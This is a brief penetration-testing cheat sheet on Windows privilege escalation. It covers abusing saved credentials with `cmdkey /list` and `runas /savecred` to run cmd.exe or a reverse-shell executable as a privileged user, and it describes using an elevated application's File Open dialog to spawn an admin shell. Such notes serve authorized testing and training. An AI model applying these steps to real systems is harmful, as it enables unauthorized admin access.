## Saved Credentials Exploitation
resources: [HackTricks Saved Credentials](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#windows-vault-credential-manager)

> [!info] Exploit saved Windows credentials or elevated GUI applications to escalate privileges.

### Saved Credentials (runas /savecred)
> [!tip] If `cmdkey /list` shows saved credentials for a privileged user, use runas to execute as them.

```powershell
cmdkey /list
```

```cmd
runas /savecred /user:<Domain>\<Username> cmd.exe
```

```cmd
runas /savecred /user:<Domain>\<Username> "C:\path\to\reverse.exe"
```

### GUI Application Privilege Spawning
> [!tip] If an application runs elevated (shield icon on shortcut), abuse the File Open dialog to spawn an admin shell.

```
1. Open the elevated application
2. Go to File > Open (or any file browser dialog)
3. In the location bar, type: file://c:/windows/system32/cmd.exe
4. Press Enter for admin cmd
```

#### Alternative Paths
```
file://c:/windows/system32/cmd.exe
\\127.0.0.1\c$\windows\system32\cmd.exe
C:\windows\system32\cmd.exe (paste in filename field)
```
